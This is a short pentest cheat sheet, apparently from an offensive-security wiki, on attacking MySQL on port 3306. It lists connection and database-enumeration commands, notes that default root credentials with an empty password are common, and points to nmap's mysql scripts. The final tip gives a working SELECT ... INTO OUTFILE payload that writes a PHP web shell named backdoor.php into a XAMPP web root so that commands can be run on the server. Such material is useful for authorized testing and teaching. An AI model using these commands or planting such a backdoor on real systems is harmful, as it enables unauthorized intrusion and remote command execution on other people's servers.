---
authors: ShutdownRepo, 0xbugatti
---

# 🛠️ MySQL

# `3306 TCP`
## Introduction 
## SQL Interaction
- Connection 
	- `mysql -u root -pP4SSw0rd -h 10.129.14.12:port`
- DB Enum
    
    - Data Base Enumeration 
	    - `show databases;`
	    - `use DBName;`
	    - `show tables;`
	    - `SHOW COLUMNS FROM mytable FROM mydb;`
	    - `select col1 from mytable ;`
- OS & DBMS Enum
	- `select version()`
	- `use sys ; select host ,unique_users from host_summary;`
    
## Misconfiguration 
    
- Publicly Exposed and Not Locally accessed 
- Default Credentials 
	- `user :  root`
	- NO Password : Empty 
    
    > [!SUCCESS]TIP:  
    >use with nmap --script mysql*


	   
    > [!SUCCESS]TIP:   WebUI service Exposed related to MySql Exposed Login with same default credentials 



> [!NOTE] TIP 
> Here Simple Way to Abuse MySql to Take Reverse Shell in a Running WebAPP via Upload file
> ``` 
> SELECT "<? php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"`
> ```



